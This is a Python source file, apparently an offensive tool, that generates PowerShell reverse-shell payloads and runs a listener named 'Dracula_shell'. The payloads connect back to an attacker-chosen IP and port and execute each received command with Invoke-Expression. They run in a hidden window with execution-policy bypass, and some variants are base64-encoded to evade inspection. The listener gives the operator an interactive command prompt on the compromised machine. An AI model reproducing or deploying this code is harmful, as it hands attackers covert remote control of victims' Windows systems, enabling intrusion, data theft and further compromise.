import socket
import base64

def generate_payload_ps(ip, port, output_file):
    batch_script_ps = f"""@echo off
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TcpClient('{ip}',{port}); $s=$c.GetStream(); $w=New-Object System.IO.StreamWriter($s); $w.AutoFlush=$true; $r=New-Object System.IO.StreamReader($s); while($true){{ $cmd=$r.ReadLine(); if($cmd -eq $null){{break}}; $out=try{{ Invoke-Expression $cmd 2>&1 | Out-String }}catch{{ $_ }}; $w.WriteLine($out) }}; $c.Close()"
"""
    return batch_script_ps

def generate_payload_ps_encoded(ip, port, output_file):
    batch_script_ps = f"""
"$c=New-Object System.Net.Sockets.TcpClient('{ip}',{port}); $s=$c.GetStream(); $w=New-Object System.IO.StreamWriter($s); $w.AutoFlush=$true; $r=New-Object System.IO.StreamReader($s); while($true){{ $cmd=$r.ReadLine(); if($cmd -eq $null){{break}}; $out=try{{ Invoke-Expression $cmd 2>&1 | Out-String }}catch{{ $_ }}; $w.WriteLine($out) }}; $c.Close()"
"""
    script_bytes = batch_script_ps.encode('utf-16le') 
    script_base64 = base64.b64encode(script_bytes).decode('utf-8')
    
    encoded_script_batch = f"""@echo off    
powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {script_base64}"""
    return encoded_script_batch

def generate_payload_ps_text(ip, port):
    script_ps = f"""
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TcpClient('{ip}',{port}); $s=$c.GetStream(); $w=New-Object System.IO.StreamWriter($s); $w.AutoFlush=$true; $r=New-Object System.IO.StreamReader($s); while($true){{ $cmd=$r.ReadLine(); if($cmd -eq $null){{break}}; $out=try{{ Invoke-Expression $cmd 2>&1 | Out-String }}catch{{ $_ }}; $w.WriteLine($out) }}; $c.Close()"
"""
    return script_ps

def generate_payload_ps_text_encoded(ip, port):
    script_ps = f"""
$c=New-Object System.Net.Sockets.TcpClient('{ip}',{port}); $s=$c.GetStream(); $w=New-Object System.IO.StreamWriter($s); $w.AutoFlush=$true; $r=New-Object System.IO.StreamReader($s); while($true){{ $cmd=$r.ReadLine(); if($cmd -eq $null){{break}}; $out=try{{ Invoke-Expression $cmd 2>&1 | Out-String }}catch{{ $_ }}; $w.WriteLine($out) }}; $c.Close()
"""
    
    script_bytes = script_ps.encode('utf-16le')  # PowerShell expects UTF-16LE for Base64 encoding
    script_base64 = base64.b64encode(script_bytes).decode('utf-8')
    
    encoded_script = f"powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {script_base64}"
    return encoded_script



def listener(ip, port):
    port = int(port)

    if ip == "0.0.0.0":
        print("[*] Listening on ALL interfaces...")

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        server.bind((ip, port))
    except OSError as e:
        print(f"[-] Failed to bind: {e}")
        return

    server.listen(1)
    print(f"[*] Listening on {ip}:{port}...")

    client, addr = server.accept()
    print(f"[+] Connection received from {addr}")

    try:
        while True:
            command = input("\033[38;5;57mDracula_shell $> \033[0m ").strip()
            if command.lower() in ["exit", "quit"]:
                client.send(b"exit")
                client.close()
                break

            client.send(command.encode() + b"\n")
            response = client.recv(4096).decode(errors="ignore")
            print("\n\033[38;5;69m",response)
    except (ConnectionResetError, KeyboardInterrupt):
        print("[-] Connection lost.")
    finally:
        client.close()
        server.close()
